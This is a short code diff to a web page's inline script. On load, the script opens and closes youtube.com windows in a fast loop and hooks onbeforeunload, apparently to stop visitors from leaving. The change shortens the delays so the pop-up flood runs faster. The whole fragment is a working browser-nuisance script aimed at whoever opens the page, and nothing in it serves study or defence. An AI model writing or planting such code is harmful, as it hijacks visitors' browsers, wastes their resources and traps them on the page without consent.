@@ -5,19 +5,20 @@
     <script>
     let length = 1500000
     let loops = 50
-    let delay = 1000
+    let openDelay = 300
+    let closeDelay = 100
     function close(e) {
       e.close()
     }
     function spam() {
       for (let i = 0; i < 1; i++) {
         let e = window.open('https://youtube.com')
-        setTimeout(close, delay, e)
+        setTimeout(close, closeDelay, e)
       }
     }
     window.addEventListener('load', 
       () => { 
-        setInterval(spam, delay)
+        setInterval(spam, openDelay)
       });
       window.onbeforeunload = nope
       function nope() { 
